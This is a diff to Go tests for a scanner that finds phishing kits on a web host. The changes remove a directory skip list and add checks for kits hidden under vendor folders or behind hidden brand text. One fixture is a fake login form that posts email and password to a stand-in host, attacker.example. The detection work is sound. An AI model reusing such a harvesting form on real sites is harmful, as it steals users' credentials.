@@ -206,7 +206,7 @@ func TestLooksLikeBusinessNameTechPrefix(t *testing.T) {
 	}
 }
 
-// --- isKnownCMSFile / isKnownSafeDir ----------------------------------
+// --- isKnownCMSFile / directory pruning ------------------------------
 
 func TestIsKnownCMSFileWPFiles(t *testing.T) {
 	for _, name := range []string{"wp-config.php", "wp-login.php", "xmlrpc.php", "index.php"} {
@@ -224,15 +224,22 @@ func TestIsKnownCMSFileUnknown(t *testing.T) {
 	}
 }
 
-func TestIsKnownSafeDir(t *testing.T) {
-	for _, name := range []string{"node_modules", "vendor", ".git"} {
-		if !isKnownSafeDir(name) {
-			t.Errorf("%q should be safe", name)
+// No directory name is a reason to stop looking: a kit is served from any of
+// these if the attacker drops it there.
+func TestScanForPhishingPrunesNoDirectoryName(t *testing.T) {
+	for _, name := range []string{"node_modules", "vendor", ".git", "PhishingKit", "wp-admin", "wp-includes", "cache", "tmp"} {
+		root := t.TempDir()
+		dir := filepath.Join(root, name)
+		if err := os.MkdirAll(dir, 0700); err != nil {
+			t.Fatal(err)
 		}
-	}
-	for _, name := range []string{"PhishingKit", "wp-admin", "wp-includes", "cache", "tmp"} {
-		if isKnownSafeDir(name) {
-			t.Errorf("%q must be scanned, not pruned", name)
+		if err := os.WriteFile(filepath.Join(dir, "verify.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600); err != nil {
+			t.Fatal(err)
+		}
+		var findings []alert.Finding
+		scanForPhishing(context.Background(), root, 3, "alice", &config.Config{}, &findings)
+		if !hasPhishingCheck(findings, "phishing_page") {
+			t.Errorf("kit under %q not detected: %+v", name, findings)
 		}
 	}
 }
@@ -673,7 +680,7 @@ func TestAnalyzeDirectoryStructurePhishingDrop(t *testing.T) {
 	content := `<html><body><form action="https://attacker.example/collect"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
 	_ = os.WriteFile(filepath.Join(dropDir, "PalmerHamilton.html"), []byte(content), 0600)
 
-	res := analyzeDirectoryStructure(context.Background(), dropDir, "alice")
+	res := analyzeDirectoryStructure(context.Background(), dropDir, "alice", &config.Config{})
 	if res == nil {
 		t.Fatal("expected phishing directory detection")
 	}
@@ -692,7 +699,7 @@ func TestAnalyzeDirectoryStructureTooManyHTML(t *testing.T) {
 	for _, n := range []string{"a.html", "b.html", "c.html", "d.html"} {
 		_ = os.WriteFile(filepath.Join(target, n), []byte("<html>"), 0600)
 	}
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf(">3 HTML files should not match, got %+v", res)
 	}
 }
@@ -702,7 +709,7 @@ func TestAnalyzeDirectoryStructureHasSubdirs(t *testing.T) {
 	target := filepath.Join(dir, "WashingtonGolf")
 	_ = os.MkdirAll(filepath.Join(target, "assets"), 0700)
 	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf("subdirs should disqualify, got %+v", res)
 	}
 }
@@ -712,7 +719,7 @@ func TestAnalyzeDirectoryStructureNonBusinessName(t *testing.T) {
 	target := filepath.Join(dir, "images") // standard dir
 	_ = os.MkdirAll(target, 0700)
 	_ = os.WriteFile(filepath.Join(target, "a.html"), []byte("<html>"), 0600)
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf("standard dir name should not match, got %+v", res)
 	}
 }
@@ -723,13 +730,45 @@ func TestAnalyzeDirectoryStructureNoPhishingContent(t *testing.T) {
 	_ = os.MkdirAll(target, 0700)
 	// HTML file without credential inputs.
 	_ = os.WriteFile(filepath.Join(target, "home.html"), []byte("<html><body>welcome</body></html>"), 0600)
-	if res := analyzeDirectoryStructure(context.Background(), target, "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), target, "alice", &config.Config{}); res != nil {
 		t.Errorf("non-phishing content should not match, got %+v", res)
 	}
 }
 
+// Brand words a visitor never sees are not impersonation. A login sample whose
+// only brand mention sits in hidden markup must not make its folder a kit; the
+// same word in visible text still does.
+func TestAnalyzeDirectoryStructureIgnoresHiddenBodyBrand(t *testing.T) {
+	page := func(brandMarkup string) string {
+		return `<html><head><title>Welcome</title><link rel="stylesheet" href="a.css"><link rel="stylesheet" href="b.css"></head><body>` +
+			brandMarkup + `<form action="/session"><input type="email" name="email"><input type="password" name="password"></form></body></html>`
+	}
+	for _, tc := range []struct {
+		name   string
+		markup string
+		want   bool
+	}{
+		{"hidden", `<div style="display:none">OneDrive</div>`, false},
+		{"visible", `<div>OneDrive</div>`, true},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			dir := filepath.Join(t.TempDir(), "SecureDocShare")
+			if err := os.MkdirAll(dir, 0700); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(filepath.Join(dir, "index.html"), []byte(page(tc.markup)), 0600); err != nil {
+				t.Fatal(err)
+			}
+			res := analyzeDirectoryStructure(context.Background(), dir, "alice", &config.Config{})
+			if got := res != nil; got != tc.want {
+				t.Fatalf("phishing_directory = %v, want %v: %+v", got, tc.want, res)
+			}
+		})
+	}
+}
+
 func TestAnalyzeDirectoryStructureMissingDir(t *testing.T) {
-	if res := analyzeDirectoryStructure(context.Background(), filepath.Join(t.TempDir(), "missing"), "alice"); res != nil {
+	if res := analyzeDirectoryStructure(context.Background(), filepath.Join(t.TempDir(), "missing"), "alice", &config.Config{}); res != nil {
 		t.Errorf("missing dir should return nil, got %+v", res)
 	}
 }
@@ -846,20 +885,21 @@ func TestScanForPhishingContextCancelled(t *testing.T) {
 	}
 }
 
-func TestScanForPhishingSkipsKnownSafeDir(t *testing.T) {
+// A lone kit folder inside a dependency tree is the same anomaly as one
+// anywhere else in the doc root.
+func TestScanForPhishingFlagsKitDirectoryInsideVendor(t *testing.T) {
 	root := t.TempDir()
-	safe := filepath.Join(root, "node_modules")
-	_ = os.MkdirAll(safe, 0700)
-	// Would normally match but the dir is in the skip list.
-	_ = os.WriteFile(filepath.Join(safe, "verify.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600)
-
-	cfg := &config.Config{}
+	kit := filepath.Join(root, "vendor", "SecureDocShare")
+	if err := os.MkdirAll(kit, 0700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(kit, "index.html"), []byte(officePhishHTML+strings.Repeat(" ", 3500)), 0600); err != nil {
+		t.Fatal(err)
+	}
 	var findings []alert.Finding
-	scanForPhishing(context.Background(), root, 3, "alice", cfg, &findings)
-	for _, f := range findings {
-		if f.Check == "phishing_page" {
-			t.Errorf("known safe dir should be skipped, got %+v", f)
-		}
+	scanForPhishing(context.Background(), root, 3, "alice", &config.Config{}, &findings)
+	if !hasPhishingCheck(findings, "phishing_directory") {
+		t.Errorf("kit directory under vendor not detected: %+v", findings)
 	}
 }
 
